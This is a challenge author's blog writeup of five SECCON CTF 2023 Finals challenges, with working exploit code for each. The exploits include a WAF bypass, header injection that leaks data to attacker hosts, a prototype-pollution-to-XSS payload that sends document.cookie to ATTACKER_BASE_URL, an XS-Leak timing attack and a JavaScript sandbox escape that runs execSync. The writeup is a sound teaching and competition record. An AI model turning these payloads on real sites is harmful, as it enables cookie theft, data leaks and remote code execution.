---
title: "SECCON CTF 2023 Finals: Author Writeups"
thumbnail: /images/2023/20231228_seccon-ctf-finals-top-01-small.jpg
date: 2023-12-28 23:00:00
tags:
    - CTF
description: Writeups for my challenges (babywaf, cgi-2023, LemonMD, DOMLeakify, and whitespace.js) in SECCON CTF 2023 Finals.
---

I wrote 4 web challenges and 1 misc challenge for SECCON CTF 2023 Finals. I hope you enjoyed the CTF and want to read your feedback and writeups.

![](/images/2023/20231228_seccon-ctf-finals-top-01.jpg)
![](/images/2023/20231228_seccon-ctf-finals-top-02.jpg =480x)

My challenges:

|Challenge|Category|Intended<br>Difficulty|Solved / 12<br>(Internatinal)|Solved / 12<br>(Domestic)| Keywords |
|:-:|:-:|:-:|:-:|:-:|:-:|
|babywaf|web|warmup| 8 | 4 |WAF bypass|
|cgi-2023|web|medium| 5 | 2 |XS-Leak, SRI|
|LemonMD|web|medium| 2 | 1 |Islands Architecture|
|DOMLeakify|web|hard| 1 | 0 |CSSi on style attributes|
|whitespace.js|misc|easy| 2 | 2 |JavaScript sandbox|

I added the source code and author's solvers to [my-ctf-challenges](https://github.com/arkark/my-ctf-challenges) repository.

## [web] babywaf

- International: 8 solved / 12
- Domestic: 4 solved / 12
- Source code: https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/babywaf

Description:

> Do you want a flag? 🚩🚩🚩
>
> - Challenge: `http://babywaf.{int,dom}.seccon.games:3000`
>
> babywaf.tar.gz

### Overview

If you click a button "Click me!", you can get a flag emoji:triangular_flag_on_post:
![](/images/2023/20231228_seccon-ctf-finals-babywaf-02.png)

There are two services `proxy` and `backend`:
```yaml
services:
  proxy:
    build: ./proxy
    restart: unless-stopped
    ports:
      - 3000:3000
  backend:
    build: ./backend
    restart: unless-stopped
    environment:
      - FLAG=SECCON{dummy}
```

`backend/index.js`:
```javascript
const express = require("express");
const fs = require("fs/promises");

const app = express();
const PORT = 3000;

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);

app.use(express.json());

app.post("/", async (req, res) => {
  if ("givemeflag" in req.body) {
    res.send(FLAG);
  } else {
    res.status(400).send("🤔");
  }
});

app.get("/", async (_req, res) => {
  const html = await fs.readFile("index.html");
  res.type("html").send(html);
});

app.listen(PORT);
```
If you can send a JSON containing a key `givemeflag` (e.g. `{"givemeflag": true}`) to `backend`, you will get the flag.

`proxy/index.js`:
```javascript
const app = require("fastify")();
const PORT = 3000;

app.register(require("@fastify/http-proxy"), {
  upstream: "http://backend:3000",
  preValidation: async (req, reply) => {
    // WAF???
    try {
      const body =
        typeof req.body === "object" ? req.body : JSON.parse(req.body);
      if ("givemeflag" in body) {
        reply.send("🚩");
      }
    } catch {}
  },
  replyOptions: {
    rewriteRequestHeaders: (_req, headers) => {
      headers["content-type"] = "application/json";
      return headers;
    },
  },
});

app.listen({ port: PORT, host: "0.0.0.0" });
```
However, the `proxy` server returns `🚩` when it receives a JSON containing a key `givemeflag`.

### Solution

You should make a JSON that satisfies the following conditions:

- The `backend` server, i.e. a JSON parser of Express, recognizes it as a JSON containing a key `givemeflag`.
- The `proxy` server fails to parse it as a JSON value at `JSON.parse(req.body)`.

In conclusion, the following JSON satisfies them where `\ufeff` is a BOM:
```json
\ufeff{"givemeflag": true}
```

Web frameworks often allow JSON values to be added a BOM at the beginning. For example, Fastify and Express check a BOM at:

- Fastify: https://github.com/fastify/secure-json-parse/blob/v2.7.0/index.js#L20-L23
- Express: https://github.com/ashtuchkin/iconv-lite/blob/v0.6.3/lib/bom-handling.js#L39-L40

It is also mentioned on section 8.1 of RFC 8259:

> Implementations MUST NOT add a byte order mark (U+FEFF) to the beginning of a networked-transmitted JSON text.  In the interests of interoperability, implementations that parse JSON texts **MAY** ignore the presence of a byte order mark rather than treating it as an error.
>
> From: https://datatracker.ietf.org/doc/html/rfc8259#section-8.1

On the other hand, `JSON.parse` does not allow a BOM:
```javascript
> JSON.parse('{"givemeflag": true}')
{ givemeflag: true }
> JSON.parse('\ufeff{"givemeflag": true}')
Uncaught SyntaxError: Unexpected token '', "{"givemef"... is not valid JSON
```

### Solver

```python
import httpx
import os

BASE_URL = os.environ["WEB_BASE_URL"]

res = httpx.post(
    BASE_URL,
    headers={"Content-Type": "text/plain"},
    content='\ufeff{"givemeflag": true}',  # UTF-8 BOM
)
print(res.text)
```

### Unintended solutions

Some teams seemed to solve this challenge using deflate encoding with only ASCII characters. It is also a valid solution.

### Flag

```
SECCON{**MAY**_in_rfc8259_8.1}
```

## [web] cgi-2023

- International: 5 solved / 12
- Domestic: 2 solved / 12
- Source code: https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/cgi-2023

Description:

> CGI is one of the lost technologies.
>
> - Challenge: `http://cgi-2023.{int,dom}.seccon.games:3000`
> - Admin bot: `http://cgi-2023.{int,dom}.seccon.games:1337`
>
> cgi-2023.tar.gz

### Overview

The web server works with Apache HTTP Server.

`web/ctf.conf`:
```apache
LoadModule cgid_module modules/mod_cgid.so

ServerName main
Listen 3000

ScriptAliasMatch / /usr/local/apache2/cgi-bin/index.cgi
AddHandler cgi-script .cgi
CGIDScriptTimeout 1

Header always set Content-Security-Policy "default-src 'none';"
```

It uses CGI and always adds CSP `default-src 'none';` to HTTP responses.

The CGI server is written in Go. It's very simple.

`web/main.go`:
```go
package main

import (
	"fmt"
	"net/http"
	"net/http/cgi"
	"strings"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if q := r.URL.Query().Get("q"); q != "" && !strings.Contains(strings.ToLower(q), "status") {
			fmt.Print(q)
		}

		flag, err := r.Cookie("FLAG")
		if err != nil {
			fmt.Fprint(w, "Hello gophers👋")
		} else {
			fmt.Fprint(w, flag.Value)
		}
	})

	cgi.Serve(nil)
}
```

It returns the flag cookie in the response body. If a parameter `q` exists, it prints the value before `fmt.Fprint(w, flag.Value)`.

The bot implementation is as follows.

`bot/bot.js`:
```javascript
import puppeteer from "puppeteer";

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);

const APP_HOST = "web";
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;

if (!/^SECCON{[a-z_]+}$/.test(FLAG) || FLAG.length > 18) {
  console.log("Bad flag");
  process.exit(1);
}

const sleep = async (msec) =>
  new Promise((resolve) => setTimeout(resolve, msec));

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/google-chrome-stable",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createIncognitoBrowserContext();

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(url, { timeout: 3 * 1000 });
    await sleep(60 * 1000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

From the implementation, the goal seems to steal the flag cookie with XS-Leak.

### Solution

Obviously, you can perform header injection attacks for a parameter `q`.

If you access the following URL:
```javascript
location = "http://localhost:3000?q=" +
  encodeURIComponent(`Content-Type: text/html\n\n<h1>Injected</h1>`)
```

The website will show:
![](/images/2023/20231228_seccon-ctf-finals-cgi-2023-01.png)

Is there a useful header that could be used for XS-Leaks?

My solution used `Content-Security-Policy-Report-Only`:

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only

If the following header exists, a CSP error report is sent to the attacker server when the subresource integrity (SRI) check fails for `style-src`:
```
Content-Security-Policy-Report-Only: style-src 'sha256-...'; report-uri http://attacker.example.com
```

Now, consider the following URL:
```javascript
location = "http://localhost:3000?q=" + encodeURIComponent(`
Content-Type: text/html
Content-Length: 74
Content-Security-Policy-Report-Only: style-src 'sha256-sUk0UQj8k0hBY6zv2BrvpRoV2OT8ywX8KXOsunsVi9U='; report-uri http://attacker.example.com

<style>`.trimStart())
```
where `sha256-sUk0UQj8k0hBY6zv2BrvpRoV2OT8ywX8KXOsunsVi9U=` is the integrity value of the following string:
```
Status: 200 OK
Content-Type: text/plain; charset=utf-8

SECCON{d
```

Then, the response body is as follows if the flag cookie is `FLAG=SECCON{dummy}`:
```html
<style>Status: 200 OK
Content-Type: text/plain; charset=utf-8

SECCON{d
```

The SRI check will succeed, and the CSP error report won't be sent.

If the SRI check fails, the CSP error report will be sent.
Thus, we can use the behavior as an oracle to perform XS-Leaks.

### Solver

Here is my full exploit:

- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/cgi-2023/solver/

### Unintended solutions

There were some unintended solutions:

- `Content-Security-Policy-Report-Only` + Lazy-loading iframe + Scroll to Text Fragment:
    - Writeups by Pencake from HK Guesser:
        - https://hackmd.io/@IOKh9vO3ReOUWJgQcV1WPQ/ryFZXFFwp#cgi-2023
    - I was surprised that lazy loading affects the time when CSP errors occur.
- Bypassing `status` checks using `%0d`:
    - Payload by Paul_Axe from More Smoked Leet Chicken:
      ```
      GET /?q=s%0dtatus:103%20Eearly%20Hints%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
      ```
    - I added a check `!strings.Contains(strings.ToLower(q), "status")` to prevent solutions with `100 Continue` or `103 Early Hints`. However, the above solution succeeded to bypass it using `%0d`:sob:
- `Content-Security-Policy-Report-Only` with `'report-sample'` + utf-16 encoding:
    - Payload by maple3142 from `${CyStick}`:
      ```
      http://web:3000/?q=Content-Security-Policy-Report-Only:%20default-src%20%27report-sample%27%3B%20report-uri%20https://YOUR_SERVER/xx%0aContent-Type:text/html%3Bcharset=utf-16%0a%0a%3C%00s%00t%00y%00l%00e%00%3E%00
      ```
    - I knew `'report-sample'` technique, but I thought it is invalid for this challenge because it can leak only the first 40 characters. The above solution used utf-16 encoding to increase the number of bytes that can be leaked.

### Flag

```
SECCON{leaky_sri}
```

## [web] LemonMD

- International: 2 solved / 12
- Domestic: 1 solved / 12
- Source code: https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/lemonmd

Description:

> 🍋📝✨
>
> - Challenge: `http://lemonmd.{int,dom}.seccon.games:3000`
> - Admin bot: `http://lemonmd.{int,dom}.seccon.games:1337`
>
> lemonmd.tar.gz

### Overview

This service provides a Markdown editor and shows the preview.

![](/images/2023/20231228_seccon-ctf-finals-lemonmd-01.png)

![](/images/2023/20231228_seccon-ctf-finals-lemonmd-02.png)

It's implemented with Fresh, which is a web framework for Deno:

- https://fresh.deno.dev/

Challenge files:
```
lemonmd
├── docker-compose.yml
├── bot
│  ├── bot.js
│  ├── Dockerfile
│  ├── index.js
│  ├── package-lock.json
│  ├── package.json
│  └── public
│     ├── index.html
│     └── main.js
└── web
   ├── deno.json
   ├── dev.ts
   ├── Dockerfile
   ├── fresh.config.ts
   ├── fresh.gen.ts
   ├── islands
   │  ├── Editor.tsx
   │  └── Preview.tsx
   ├── main.ts
   ├── README.md
   ├── routes
   │  ├── [id].tsx
   │  ├── _app.tsx
   │  ├── index.tsx
   │  └── save.ts
   └── utils
      ├── db.ts
      └── redirect.ts
```

The goal is to get XSS to steal the flag cookie.

### Solution

#### Step 1: Props Manipulation for Islands Architecture

Fresh uses Islands Architecture, and the following article introduces how islands work in Fresh:

- [A Gentle Introduction to Islands - Deno](https://deno.com/blog/intro-to-islands)

A generated client-side script is as follows (formatted):
```html
<script type="module" nonce="7a73a306c5994dcfae243e3c1f5f8a43">
  import { deserialize } from "/_frsh/js/1b87d6604d1a2bf10bc74f6b5b3491b0b6bc5272/deserializer.js";
  import { signal } from "/_frsh/js/1b87d6604d1a2bf10bc74f6b5b3491b0b6bc5272/signals.js";

  const ST = document.getElementById("__FRSH_STATE").textContent;
  const STATE = deserialize(ST, signal);

  import { revive } from "/_frsh/js/1b87d6604d1a2bf10bc74f6b5b3491b0b6bc5272/main.js";
  import editor_default from "/_frsh/js/1b87d6604d1a2bf10bc74f6b5b3491b0b6bc5272/island-editor.js";
  import preview_default from "/_frsh/js/1b87d6604d1a2bf10bc74f6b5b3491b0b6bc5272/island-preview.js";

  const propsArr = typeof STATE !== "undefined" ? STATE[0] : [];
  revive({editor_default:editor_default,preview_default:preview_default,}, propsArr);
</script>
```

Fresh renders island components according to a JSON value of:
```javascript
document.getElementById("__FRSH_STATE").textContent
```

So, if users can inject an HTML element with `id="__FRSH_STATE"`, it is possible to manipulate the rendering process and potentially change the behavior of the application.

`web/islands/Preview.tsx`:
```typescript
import type { Signal } from "@preact/signals";
import { render } from "$gfm";

interface PreviewProps {
  text: Signal<string>;
}

export default function Preview(props: PreviewProps) {
  return (
    <div
      class="markdown-body"
      dangerouslySetInnerHTML={{ __html: render(props.text.value) }}
    />
  );
}
```

`Preview` renders a parameter `text` as a Markdown content with [deno-gfm](https://github.com/denoland/deno-gfm). The library prevents XSS attacks with [sanitize-html](https://github.com/apostrophecms/sanitize-html), but allows adding `id` attributes to some HTML elements:

- https://github.com/denoland/deno-gfm/blob/0.2.5/mod.ts#L214-L219

It means that you can manipulate the value of `PreviewProps` with an HTML element with `id="__FRSH_STATE"`.

For instance, if you input the following Markdown:
```html
<h1 id="__FRSH_STATE">{"v":{"0":[{"text":{"_f":"s","v":"Successfully manipulated!"}}]}}</h1>
```

![](/images/2023/20231228_seccon-ctf-finals-lemonmd-03.png)

Fresh recognizes `Successfully manipulated!` as a value of `text` and renders it:

![](/images/2023/20231228_seccon-ctf-finals-lemonmd-04.png)

#### Step 2: Prototype Pollution in Deserialization

Next, let's take a dive into the implementation of Fresh.

The source code of `deserialize` is as follows:

- https://github.com/denoland/fresh/blob/1.6.1/src/runtime/deserializer.ts#L21-L63

```typescript
export function deserialize(
  str: string,
  signal?: <T>(a: T) => Signal<T>,
): unknown {
  /* ...snip... */

  const { v, r } = JSON.parse(str, reviver);
  const references = (r ?? []) as [string[], ...string[][]][];
  for (const [targetPath, ...refPaths] of references) {
    const target = targetPath.reduce((o, k) => k === null ? o : o[k], v);
    for (const refPath of refPaths) {
      if (refPath.length === 0) throw new Error("Invalid reference");
      // set the reference to the target object
      const parent = refPath.slice(0, -1).reduce(
        (o, k) => k === null ? o : o[k],
        v,
      );
      parent[refPath[refPath.length - 1]!] = target;
    }
  }
  return v;
}
```

There is no check for Prototype Pollution attacks. It means that you are free to pollute anything you want through the props maniplation of Step 1.

For instance, if you input the following Markdown:
```html
<h1 id="__FRSH_STATE">{"v":{"bar":"foo"},"r":[[["bar"],["constructor","prototype","polluted"]]]}</h1>
```

![](/images/2023/20231228_seccon-ctf-finals-lemonmd-05.png)

The `polluted` property is polluted to `"foo"`:
![](/images/2023/20231228_seccon-ctf-finals-lemonmd-06.png)

#### Step 3: Prototype Pollution Gadgets to XSS

The rest work you should do is finding a PP gadget to enable XSS attacks.

My solution used a known PP gadget for sanitize-html:

- `({})["*"]` -> `["onerror"]`
    - To allow `onerror` attribute for sanitization and enable XSS attacks.
    - FYI: https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/

There seemed to be teams that polluted `disableHtmlSanitization` as a PP gadget:

- Writeups by icchy from `:(` (This is a team name):
    - https://gist.github.com/icchy/ace0030201354729e0f2beedb362733d

### Solver

Finally, the following Markdown causes XSS and leaks the flag cookie:
```javascript
const text = `<h1 id="__FRSH_STATE">${JSON.stringify({
  v: {
    0: [
      {
        text: {
          _f: "s",
          v: `&lt;img src=0 onerror="navigator.sendBeacon('${ATTACKER_BASE_URL}', document.cookie)"&gt;`,
        },
      },
    ],
    "*": ["onerror"],
  },
  r: [[["*"], ["constructor", "prototype", "*"]]],
})}</h1>`;
```

Here is my full exploit:

- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/lemonmd/solver/

### Flag

```
SECCON{Do_not_m1x_HTML_injecti0n_and_I5lands_Archit3cture}
```

## [web] DOMLeakify

- International: 1 solved / 12
- Domestic: 0 solved / 12
- Source code: https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify

Description:

> NO LEAK, NO LIFE.
>
> - Challenge: `http://domleakify.{int,dom}.seccon.games:3000`
> - Admin bot: `http://domleakify.{int,dom}.seccon.games:1337`
>
> domleakify.tar.gz

### Overview

This is a very simple XS-Leak challenge, but the intended difficulty is hard.
The source code is as follows.

`web/app.py`:
```python
from flask import Flask, request, render_template

app = Flask(__name__)


@app.get("/")
def leakable():
    flag = request.cookies.get("FLAG", "SECCON{dummy}")[:18]
    return render_template("index.html", flag=flag)
```

`web/templates/index.html`:
```html
<!doctype html>
<html>
<head>
  <title>DOMLeakify</title>
  <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
</head>
<body>
  <h1>DOMLeakify</h1>
  <div id="content"></div>
  <ul>
    {% for i in range(flag|length) %}
      {% set prefix = flag[:i+1] %}
      <li id="{{ prefix }}" class="{{ prefix }}">{{ prefix }}</li>
    {% endfor %}
  </ul>
  <script>
    (() => {
      const html = decodeURIComponent(location.hash.slice(1));
      if (html.length > 512) return;
      document.getElementById("content").innerHTML = DOMPurify.sanitize(html, {
        FORBID_TAGS: ["style"],   // No CSS Injection
        FORBID_ATTR: ["loading"], // No lazy loading
      });
    })();
  </script>
</body>
</html>
```

![](/images/2023/20231228_seccon-ctf-finals-domleakify-01.png)

The goal is to construct an oracle to leak the IDs of the prefixes.

Also, as an important fact, the admin bot works on **Firefox**:
```javascript
const browser = await firefox.launch({
  headless: true,
  firefoxUserPrefs: {
    "javascript.options.wasm": false,
    "javascript.options.baselinejit": false,
  },
});
```

### Solution

```javascript
document.getElementById("content").innerHTML = DOMPurify.sanitize(html, {
  FORBID_TAGS: ["style"],   // No CSS Injection
  FORBID_ATTR: ["loading"], // No lazy loading
});
```

This disallows `style` elements and `loading` attributes, which are often used for XS-Leak techniques. What can we do under the condition?

In conclusion, my solution used CSS injection on **`style` attributes**.

As far as I know, well-known CSS injection techniques always assume that users can inject content into **`<style>` elements**, not `style` attributes. However, the following approach enables to leak IDs using malicious style attributes.

The most important key of my solution is `-moz-element(#id)`:

- https://developer.mozilla.org/en-US/docs/Web/CSS/element

This is an experimental CSS function and currently only works on Firefox:

![](/images/2023/20231228_seccon-ctf-finals-domleakify-02.png)

The CSS function renders an image generated from the HTML element whose ID is specified by the argument.

For instance, if you access the following URL on Firefox:
```html
http://localhost:3000/#<div style="background-image: -moz-element(#SECCON\7b\64); height: 100px;"></div>
```

Firefox shows a `<div>` element that renders a background image generated from the element with `id="#SECCON{d"`:
![](/images/2023/20231228_seccon-ctf-finals-domleakify-03.png)

Next, if you access the following URL on Firefox:
```html
http://localhost:3000/#<div style="background-image: -moz-element(#SECCON\7b\64); height: 100px;"></div>
```

The `<div>` element does not render any background image because there is no element with `id="#SECCON{a"`:
![](/images/2023/20231228_seccon-ctf-finals-domleakify-04.png)

Can we utilize this difference to construct an oracle? Yes.

Consider the following element:
```html
<div style="
    background-image: -moz-element(#SECCON\7b\64);
    height: 1000px;
    transform: scale(200) translate(50%, 0%);
    filter: drop-shadow(8px 8px 8px blue);
"></div>
```

The style attribute applies graphical effects to the background image:
![](/images/2023/20231228_seccon-ctf-finals-domleakify-05.png)

The process is very heavy. If you increase the values of `drop-shadow`, Firefox will be busy or crash:boom:

On the other hand, consider the following element:
```html
<div style="
    background-image: -moz-element(#SECCON\7b\61);
    height: 1000px;
    transform: scale(200) translate(50%, 0%);
    filter: drop-shadow(8px 8px 8px blue);
"></div>
```

The `<div>` element does not render any background image and the rendering process is light:
![](/images/2023/20231228_seccon-ctf-finals-domleakify-06.png)

Okay, it is possible to detect whether the element with a given ID exists or not using typical XS-Leak techniques to judge the busy state of the browser!

Therefore, using the oracle, it is also possible to leak one character of the flag cookie at a time from the beginning.

### Solver

In my solver, the function used for the timing attack is like this:
```javascript
// https://github.com/arkark/my-ctf-challenges/blob/main/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify/solver/public/main.js#L20-L45

const measure = async (prefix) => {
  const hex = [...prefix]
    .map((c) => "\\" + c.charCodeAt(0).toString(16).padStart(2, "0"))
    .join("");
  const url = `${BASE_URL}#${encodeURIComponent(
    `<div style="background-image: -moz-element(#${hex}); height: 1000px; transform: scale(200) translate(50%, 0%); filter: drop-shadow(36px 36px 36px blue);"></div>`
  )}`;

  const ws = [];

  ws.push(open(url));
  await Promise.all(ws.map((w) => wait(w)));
  await sleep(100);

  let start = performance.now();
  for (let i = 0; i < 3; i++) {
    ws.push(open(BASE_URL));
  }
  await Promise.all(ws.map((w) => wait(w)));
  const end = performance.now();

  for (const w of ws) {
    w.close();
  }
  return end - start;
};
```

Here is my full exploit:

- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify/solver/

### Unintended solutions

This challenge was solved only by HK Guesser and the solution was unintended.
However, it was a creative and interesting oracle using `autoplay` of `<video>`:

- Writeups by Pencake from HK Guesser:
    - https://hackmd.io/@IOKh9vO3ReOUWJgQcV1WPQ/ryFZXFFwp#DOMLeakify

### Flag

```
SECCON{attr_cssi}
```

## [misc] whitespace.js

- International: 2 solved / 12
- Domestic: 2 solved / 12
- Source code: https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202312_SECCON_CTF_2023_Finals/misc/whitespace-js

Description:

> Don't worry, this is not an esolang challenge.
>
> - Challenge: `http://whitespace-js.{int,dom}.seccon.games:3000`
>
> whitespace-js.tar.gz

### Overview

This is a JavaScript sandbox challenge.

`sandbox/index.js`:
```javascript
/* snip */

app.post("/", async (req, res) => {
  const { expr } = req.body;

  const proc = await execFile("node", ["whitespace.js", expr], {
    timeout: 2000,
  }).catch((e) => e);

  res.send(proc.killed ? "Timeout" : proc.stdout);
});

/* snip */
```

`sandbox/whitespace.js`:
```javascript
const WHITESPACE = " ";

const code = [...process.argv[2].trim()].join(WHITESPACE);
if (code.includes("(") || code.includes(")")) {
  console.log("Do not call functions :(");
  process.exit();
}

try {
  console.log(eval(code));
} catch {
  console.log("Error");
}
```

The goal is to get RCE to read a flag file with an unknown name.

### Solution & Solver

I expected many creative solutions by CTF players that love JavaScript.
Actually, each team that solved this challenge used a different solution.

My solver is one example of solutions:
```python
import httpx
import os

BASE_URL = os.environ["WEB_BASE_URL"]


def make_str(xs: str) -> str:
    ys = []
    for x in xs:
        if x == "(":
            ys.append(f'[][{make_str("toString")}][{make_str("toString")}]``[9+8]')
        elif x == ")":
            ys.append(f'[][{make_str("toString")}][{make_str("toString")}]``[9+9]')
        else:
            ys.append(f'"{x}"[1]')
    return "+".join(ys)


command = "cat /flag-*.txt"

func_body = f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"

lines = [
    # [ ].__proto__.source = "**"
    f'[][{make_str("__proto__")}][{make_str("source")}] = {make_str("**")}',

    # [ ].__proto__.flags = func_body
    f'[][{make_str("__proto__")}][{make_str("flags")}] = {make_str(func_body)}',

    # [ ].__proto__.toString = / /.toString
    f'[][{make_str("__proto__")}][{make_str("toString")}] = //[{make_str("toString")}]',

    # -> [].toString() === `/**/${func_body}`


    # Function` `` `
    f'[][{make_str("constructor")}][{make_str("constructor")}]````',
]
expr = ";".join(lines)

res = httpx.post(
    BASE_URL,
    json={
        "expr": expr,
    },
)
print(res.text)
```

### Flag[^whitespace-js-flag]

```
SECCON{P4querett3_Down_the_Bunburr0ws}
```

[^whitespace-js-flag]: https://store.steampowered.com/app/1628610/
